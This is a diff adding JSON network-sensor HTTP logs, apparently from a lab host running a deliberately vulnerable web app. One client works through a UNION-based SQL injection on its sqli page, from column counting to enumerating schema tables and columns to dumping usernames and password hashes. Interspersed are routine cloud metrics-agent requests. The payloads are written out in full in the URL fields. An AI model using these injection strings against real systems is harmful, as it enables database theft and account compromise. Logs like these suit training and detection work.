@@ -1,0 +1,401 @@
+{
+  "timestamp": "2026-01-24T14:55:16.044227+0000",
+  "flow_id": 995705505133587,
+  "in_iface": "eth0",
+  "event_type": "http",
+  "src_ip": "84.54.92.80",
+  "src_port": 11789,
+  "dest_ip": "165.232.172.9",
+  "dest_port": 4280,
+  "proto": "TCP",
+  "ip_v": 4,
+  "pkt_src": "wire/pcap",
+  "tx_id": 0,
+  "http": {
+    "hostname": "165.232.172.9",
+    "http_port": 4280,
+    "url": "/vulnerabilities/sqli/?id=apple'+order+by+2--+&Submit=Submit",
+    "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+    "http_content_type": "text/html",
+    "http_refer": "http://165.232.172.9:4280/vulnerabilities/sqli/",
+    "http_method": "GET",
+    "protocol": "HTTP/1.1",
+    "status": 200,
+    "length": 1437
+  }
+}
+{
+  "timestamp": "2026-01-24T14:55:50.606043+0000",
+  "flow_id": 1934728882464296,
+  "in_iface": "eth0",
+  "event_type": "http",
+  "src_ip": "165.232.172.9",
+  "src_port": 48524,
+  "dest_ip": "169.254.169.254",
+  "dest_port": 80,
+  "proto": "TCP",
+  "ip_v": 4,
+  "pkt_src": "wire/pcap",
+  "tx_id": 0,
+  "http": {
+    "hostname": "169.254.169.254",
+    "url": "/v1/metrics/droplet_id/546904903",
+    "http_user_agent": "do-agent-3.18.7",
+    "http_content_type": "application/json",
+    "http_method": "POST",
+    "protocol": "HTTP/1.1",
+    "status": 202,
+    "length": 66
+  }
+}
+{
+  "timestamp": "2026-01-24T14:57:35.758336+0000",
+  "flow_id": 2122445219693479,
+  "in_iface": "eth0",
+  "event_type": "http",
+  "src_ip": "84.54.92.80",
+  "src_port": 42719,
+  "dest_ip": "165.232.172.9",
+  "dest_port": 4280,
+  "proto": "TCP",
+  "ip_v": 4,
+  "pkt_src": "wire/pcap",
+  "tx_id": 0,
+  "http": {
+    "hostname": "165.232.172.9",
+    "http_port": 4280,
+    "url": "/vulnerabilities/sqli/?id=apple'+union+select+table_name,null+from+information_schema.tables+where+table.schema+=+database()--+&Submit=Submit",
+    "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+    "http_content_type": "text/html",
+    "http_refer": "http://165.232.172.9:4280/vulnerabilities/sqli/",
+    "http_method": "GET",
+    "protocol": "HTTP/1.1",
+    "status": 200,
+    "length": 277
+  }
+}
+{
+  "timestamp": "2026-01-24T14:57:50.599671+0000",
+  "flow_id": 1811958285126116,
+  "in_iface": "eth0",
+  "event_type": "http",
+  "src_ip": "165.232.172.9",
+  "src_port": 43698,
+  "dest_ip": "169.254.169.254",
+  "dest_port": 80,
+  "proto": "TCP",
+  "ip_v": 4,
+  "pkt_src": "wire/pcap",
+  "tx_id": 0,
+  "http": {
+    "hostname": "169.254.169.254",
+    "url": "/v1/metrics/droplet_id/546904903",
+    "http_user_agent": "do-agent-3.18.7",
+    "http_content_type": "application/json",
+    "http_method": "POST",
+    "protocol": "HTTP/1.1",
+    "status": 202,
+    "length": 66
+  }
+}
+{
+  "timestamp": "2026-01-24T14:58:10.570636+0000",
+  "flow_id": 660723056453555,
+  "in_iface": "eth0",
+  "event_type": "http",
+  "src_ip": "84.54.92.80",
+  "src_port": 64545,
+  "dest_ip": "165.232.172.9",
+  "dest_port": 4280,
+  "proto": "TCP",
+  "ip_v": 4,
+  "pkt_src": "wire/pcap",
+  "tx_id": 0,
+  "http": {
+    "hostname": "165.232.172.9",
+    "http_port": 4280,
+    "url": "/vulnerabilities/sqli/?id=apple'+union+select+table_name,null+from+information_schema.tables+where+table.schema+=+database()--+&Submit=Submit",
+    "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+    "http_content_type": "text/html",
+    "http_refer": "http://165.232.172.9:4280/vulnerabilities/sqli/",
+    "http_method": "GET",
+    "protocol": "HTTP/1.1",
+    "status": 200,
+    "length": 277
+  }
+}
+{
+  "timestamp": "2026-01-24T14:58:49.604240+0000",
+  "flow_id": 56515179840080,
+  "in_iface": "eth0",
+  "event_type": "http",
+  "src_ip": "84.54.92.80",
+  "src_port": 27212,
+  "dest_ip": "165.232.172.9",
+  "dest_port": 4280,
+  "proto": "TCP",
+  "ip_v": 4,
+  "pkt_src": "wire/pcap",
+  "tx_id": 0,
+  "http": {
+    "hostname": "165.232.172.9",
+    "http_port": 4280,
+    "url": "/vulnerabilities/sqli/?id=apple'+union+select+table_name,null+from+information_schema.tables+where+table_schema+=+database()--+&Submit=Submit",
+    "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+    "http_content_type": "text/html",
+    "http_refer": "http://165.232.172.9:4280/vulnerabilities/sqli/",
+    "http_method": "GET",
+    "protocol": "HTTP/1.1",
+    "status": 200,
+    "length": 1549
+  }
+}
+{
+  "timestamp": "2026-01-24T14:59:50.656862+0000",
+  "flow_id": 1929613905333693,
+  "in_iface": "eth0",
+  "event_type": "http",
+  "src_ip": "165.232.172.9",
+  "src_port": 60080,
+  "dest_ip": "169.254.169.254",
+  "dest_port": 80,
+  "proto": "TCP",
+  "ip_v": 4,
+  "pkt_src": "wire/pcap",
+  "tx_id": 0,
+  "http": {
+    "hostname": "169.254.169.254",
+    "url": "/v1/metrics/droplet_id/546904903",
+    "http_user_agent": "do-agent-3.18.7",
+    "http_content_type": "application/json",
+    "http_method": "POST",
+    "protocol": "HTTP/1.1",
+    "status": 202,
+    "length": 66
+  }
+}
+{
+  "timestamp": "2026-01-24T15:01:05.481339+0000",
+  "flow_id": 393957213068840,
+  "in_iface": "eth0",
+  "event_type": "http",
+  "src_ip": "84.54.92.80",
+  "src_port": 46162,
+  "dest_ip": "165.232.172.9",
+  "dest_port": 4280,
+  "proto": "TCP",
+  "ip_v": 4,
+  "pkt_src": "wire/pcap",
+  "tx_id": 0,
+  "http": {
+    "hostname": "165.232.172.9",
+    "http_port": 4280,
+    "url": "/vulnerabilities/sqli/?id=apple'+union+select+column_name,null+from+information_schema.columns+where+table_name+=+'users'--+&Submit=Submit",
+    "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+    "http_content_type": "text/html",
+    "http_refer": "http://165.232.172.9:4280/vulnerabilities/sqli/",
+    "http_method": "GET",
+    "protocol": "HTTP/1.1",
+    "status": 200,
+    "length": 1595
+  }
+}
+{
+  "timestamp": "2026-01-24T15:01:50.741549+0000",
+  "flow_id": 1764567667282657,
+  "in_iface": "eth0",
+  "event_type": "http",
+  "src_ip": "165.232.172.9",
+  "src_port": 59894,
+  "dest_ip": "169.254.169.254",
+  "dest_port": 80,
+  "proto": "TCP",
+  "ip_v": 4,
+  "pkt_src": "wire/pcap",
+  "tx_id": 0,
+  "http": {
+    "hostname": "169.254.169.254",
+    "url": "/v1/metrics/droplet_id/546904903",
+    "http_user_agent": "do-agent-3.18.7",
+    "http_content_type": "application/json",
+    "http_method": "POST",
+    "protocol": "HTTP/1.1",
+    "status": 202,
+    "length": 66
+  }
+}
+{
+  "timestamp": "2026-01-24T15:02:43.035246+0000",
+  "flow_id": 681525258535628,
+  "in_iface": "eth0",
+  "event_type": "http",
+  "src_ip": "84.54.92.80",
+  "src_port": 9631,
+  "dest_ip": "165.232.172.9",
+  "dest_port": 4280,
+  "proto": "TCP",
+  "ip_v": 4,
+  "pkt_src": "wire/pcap",
+  "tx_id": 0,
+  "http": {
+    "hostname": "165.232.172.9",
+    "http_port": 4280,
+    "url": "/vulnerabilities/sqli/?id=apple%27+union+select+column_name,null+from+information_schema.columns+where+table_name+=+%27users%27--+&Submit=Submit",
+    "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+    "http_content_type": "text/html",
+    "http_method": "GET",
+    "protocol": "HTTP/1.1",
+    "status": 200,
+    "length": 1595
+  }
+}
+{
+  "timestamp": "2026-01-24T15:03:28.574320+0000",
+  "flow_id": 255318397524924,
+  "in_iface": "eth0",
+  "event_type": "http",
+  "src_ip": "84.54.92.80",
+  "src_port": 39371,
+  "dest_ip": "165.232.172.9",
+  "dest_port": 4280,
+  "proto": "TCP",
+  "ip_v": 4,
+  "pkt_src": "wire/pcap",
+  "tx_id": 0,
+  "http": {
+    "hostname": "165.232.172.9",
+    "http_port": 4280,
+    "url": "/vulnerabilities/sqli/?id=apple%27+union+select+table_name,null+from+information_schema.tables+where+table.schema+=+database()--+&Submit=Submit",
+    "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+    "http_content_type": "text/html",
+    "http_method": "GET",
+    "protocol": "HTTP/1.1",
+    "status": 200,
+    "length": 277
+  }
+}
+{
+  "timestamp": "2026-01-24T15:03:40.425974+0000",
+  "flow_id": 1271745015067847,
+  "in_iface": "eth0",
+  "event_type": "http",
+  "src_ip": "84.54.92.80",
+  "src_port": 5216,
+  "dest_ip": "165.232.172.9",
+  "dest_port": 4280,
+  "proto": "TCP",
+  "ip_v": 4,
+  "pkt_src": "wire/pcap",
+  "tx_id": 0,
+  "http": {
+    "hostname": "165.232.172.9",
+    "http_port": 4280,
+    "url": "/vulnerabilities/sqli/?id=apple%27+union+select+table_name,null+from+information_schema.tables+where+table.schema+=+database()--+&Submit=Submit",
+    "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+    "http_content_type": "text/html",
+    "http_method": "GET",
+    "protocol": "HTTP/1.1",
+    "status": 200,
+    "length": 277
+  }
+}
+{
+  "timestamp": "2026-01-24T15:03:50.700093+0000",
+  "flow_id": 1895727456617843,
+  "in_iface": "eth0",
+  "event_type": "http",
+  "src_ip": "165.232.172.9",
+  "src_port": 55228,
+  "dest_ip": "169.254.169.254",
+  "dest_port": 80,
+  "proto": "TCP",
+  "ip_v": 4,
+  "pkt_src": "wire/pcap",
+  "tx_id": 0,
+  "http": {
+    "hostname": "169.254.169.254",
+    "url": "/v1/metrics/droplet_id/546904903",
+    "http_user_agent": "do-agent-3.18.7",
+    "http_content_type": "application/json",
+    "http_method": "POST",
+    "protocol": "HTTP/1.1",
+    "status": 202,
+    "length": 66
+  }
+}
+{
+  "timestamp": "2026-01-24T15:04:01.323705+0000",
+  "flow_id": 526619504769107,
+  "in_iface": "eth0",
+  "event_type": "http",
+  "src_ip": "84.54.92.80",
+  "src_port": 39099,
+  "dest_ip": "165.232.172.9",
+  "dest_port": 4280,
+  "proto": "TCP",
+  "ip_v": 4,
+  "pkt_src": "wire/pcap",
+  "tx_id": 0,
+  "http": {
+    "hostname": "165.232.172.9",
+    "http_port": 4280,
+    "url": "/vulnerabilities/sqli/?id=apple%27+union+select+table_name,null+from+information_schema.tables+where+table_schema+=+database()--+&Submit=Submit",
+    "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+    "http_content_type": "text/html",
+    "http_method": "GET",
+    "protocol": "HTTP/1.1",
+    "status": 200,
+    "length": 1549
+  }
+}
+{
+  "timestamp": "2026-01-24T15:04:54.443071+0000",
+  "flow_id": 1883375136007037,
+  "in_iface": "eth0",
+  "event_type": "http",
+  "src_ip": "84.54.92.80",
+  "src_port": 29653,
+  "dest_ip": "165.232.172.9",
+  "dest_port": 4280,
+  "proto": "TCP",
+  "ip_v": 4,
+  "pkt_src": "wire/pcap",
+  "tx_id": 0,
+  "http": {
+    "hostname": "165.232.172.9",
+    "http_port": 4280,
+    "url": "/vulnerabilities/sqli/?id=apple'+union+select+user,password+from+users--+&Submit=Submit",
+    "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+    "http_content_type": "text/html",
+    "http_refer": "http://165.232.172.9:4280/vulnerabilities/sqli/",
+    "http_method": "GET",
+    "protocol": "HTTP/1.1",
+    "status": 200,
+    "length": 1648
+  }
+}
+{
+  "timestamp": "2026-01-24T15:05:14.138635+0000",
+  "flow_id": 403572059741615,
+  "in_iface": "eth0",
+  "event_type": "http",
+  "src_ip": "84.54.92.80",
+  "src_port": 50474,
+  "dest_ip": "165.232.172.9",
+  "dest_port": 4280,
+  "proto": "TCP",
+  "ip_v": 4,
+  "pkt_src": "wire/pcap",
+  "tx_id": 0,
+  "http": {
+    "hostname": "165.232.172.9",
+    "http_port": 4280,
+    "url": "/vulnerabilities/sqli/?id=apple%27+union+select+user,password+from+users--+&Submit=Submit",
+    "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+    "http_content_type": "text/html",
+    "http_method": "GET",
+    "protocol": "HTTP/1.1",
+    "status": 200,
+    "length": 1648
+  }
+}
